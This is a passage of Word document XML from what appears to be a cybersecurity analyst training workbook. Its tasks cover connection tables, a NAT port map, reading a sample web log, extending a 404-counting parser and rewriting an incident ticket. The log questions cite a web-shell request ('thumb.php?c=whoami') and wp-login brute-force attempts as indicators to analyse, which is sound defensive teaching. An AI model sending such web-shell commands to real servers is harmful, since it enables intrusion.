      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>25 minutes · Topic 5.3 · Knowledge 1.4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Run the connection command from Activity 2. Pick </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>five</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> connections and fill in the table. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Do not include screenshots that show anything but this table</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — no personal browsing.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Owning process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Remote port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Service (443=HTTPS, etc.)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Public or private?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Normal for this process?</w:t>
            </w:r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One line:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> which connection would you look at first if this were an alert machine, and why?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pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>TASK 5 — DRAW YOUR NETWORK'S PORT MAP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>20 minutes · Topic 5.3 · Knowledge 1.4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Draw (on paper, or in any tool) a simple diagram of your own home or lab network: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Your machine with its </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>private</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> address (from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ipconfig</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>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The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>router / gateway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The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> address the network shares (search "what is my IP", or write "public IP" as a box — do not publish the actual number)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Mark where </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>NAT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> happens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If you know of any </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>port forwarding</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> on your router, show it as an arrow inward; if none, write "no forwarded ports found"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Two lines:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> what would an attacker on the internet be able to reach directly, and what is hidden behind NAT?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pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>TASK 6 — READ THE WEB LOG</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>25 minutes · Topic 5.4 · Knowledge 1.2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>First, make your own log:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> start </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>python -m http.server 8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, visit </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>http://localhost:8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (a 200) and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>http://localhost:8000/nope.html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (a 404), and copy the two lines from the server window.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Then answer these six questions about `Day_5_access_log.txt`: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Which address made the most requests, and how many?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Which address is a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>scanner</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, and what in its lines tells you?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 xml:space="preserve">How many </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>wp-login.php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> POSTs came from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>203.0.113.45</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, and what does the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>302</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> after them mean?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sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">What do the two </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>403</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> responses to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>192.0.2.77</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> tell you the server did?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sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Find the line </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>thumb.php?c=whoami</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> with status </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>200</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">. Why is this the worst line in the log?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6. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">In one sentence: what happened to this website?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pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>TASK 7 — EXTEND THE PARSER</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>25 minutes · Topic 5.5 · Knowledge 1.3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Open </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Day_5_log_parser.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">. Add a third count: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>404s per IP address</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>flag any address with more than 5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>. A hint — you already have the pieces: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add a third </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Counter()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> near the top, e.g. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>not_found = Counter()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inside the loop, after you have </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>status</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, add: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>if status == "404": not_found[ip] += 1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after the existing prints, print </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>not_found.most_common()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> and mark any count over 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Run it: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>python Day_5_log_parser.py Day_5_access_log.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Hand in:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> your edited script, and its output. Your output should flag </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>one</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> address.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No Python?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Do it by hand: count, from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Day_5_access_log.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>, how many 404s each address caused, and write the tally. The skill being marked is reading the log.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>TASK 8 — RE-TICKET WKS-311</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve">5 minutes · Topic 5.5 / quality · </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>ICT315202</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve"> LO2 · </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>CS-ICT251101</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve"> E1 PC 1.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">On Day 3 your ticket for WKS-311 was missing the process and the port detail, because nobody could get them. Now you can. Using the connection snapshot in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Day_5_Sample_Data.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> §1, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>re-write the WKS-311 ticket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> with: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the private address of WKS-311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the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>process</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> that owns the bad connection, and where it lives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the remote address and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, and what the port means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your decision (threat / detection / routine) and the reason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what you need next</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Then self-check it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> against your class QA checklist from Day 3. Which field does the new ticket have that the Day 3 one lacked? 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pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>TASK 9 — REFLECTION</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>10 minutes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What is one thing an alert points at that you could not read this morning but can read now?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You are handed a script found in a scheduled task. What do you do, and what do you </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> do?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Which was harder — reading the network, the web log, or the script — and why?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7 — HANDING IN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Put everything in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Evidence/Day_05/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> and submit by 4:00 PM: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1 signed build checklist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2 four baseline CSVs (named), hashes, register table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3 maintenance note with two matching hashes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4 five annotated connections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5 port-map diagram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6 six web-log answers plus your own two log lines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7 edited parser and its output (or the hand tally)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8 re-written WKS-311 ticket + self-check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9 three reflection answers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Tomorrow: Day 6, the SIEM.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> You will enrol a Wazuh agent, so bring a machine you can install software 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